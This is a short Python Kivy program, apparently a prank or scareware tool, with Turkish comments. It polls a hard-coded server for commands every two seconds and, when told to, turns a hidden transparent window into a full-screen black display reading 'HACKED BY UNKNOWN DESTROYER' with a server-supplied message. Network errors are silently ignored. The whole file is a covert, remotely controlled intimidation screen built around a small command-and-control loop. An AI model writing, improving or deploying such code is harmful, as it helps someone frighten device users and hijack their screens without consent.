from kivy.app import App
from kivy.lang import Builder
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
import requests

# Buraya kendi sunucu IP’nı koy: (Örn: 192.168.1.145:5000)
SERVER_URL = "http://192.168.1.145:5000/get_command"

KV = """
<LockScreen>:
    canvas:
        Color:
            rgba: 0, 0, 0, 1
        Rectangle:
            pos: self.pos
            size: self.size

    Label:
        id: hack_label
        text: ""
        font_size: "24sp"
        color: 1, 0, 0, 1
        halign: "center"
        valign: "middle"
        text_size: self.size
"""

class LockScreen(BoxLayout):
    pass

class HackzillaApp(App):
    def build(self):
        # KV’yi yükle, sonra LockScreen() örneğini kök widget yap
        Builder.load_string(KV)
        self.root = LockScreen()
        self.root.opacity = 0
        Clock.schedule_interval(self.fetch_command, 2)
        return self.root

    def fetch_command(self, dt):
        try:
            resp = requests.get(SERVER_URL, timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("lock_screen"):
                    self.show_lock_screen(data.get("message", ""))
                else:
                    self.hide_lock_screen()
        except Exception:
            pass

    def show_lock_screen(self, msg):
        self.root.opacity = 1
        label = self.root.ids.hack_label
        display_text = "HACKED BY UNKNOWN DESTROYER\n\n"
        if msg:
            display_text += f"{msg}"
        label.text = display_text

    def hide_lock_screen(self):
        self.root.opacity = 0

if __name__ == "__main__":
    HackzillaApp().run()
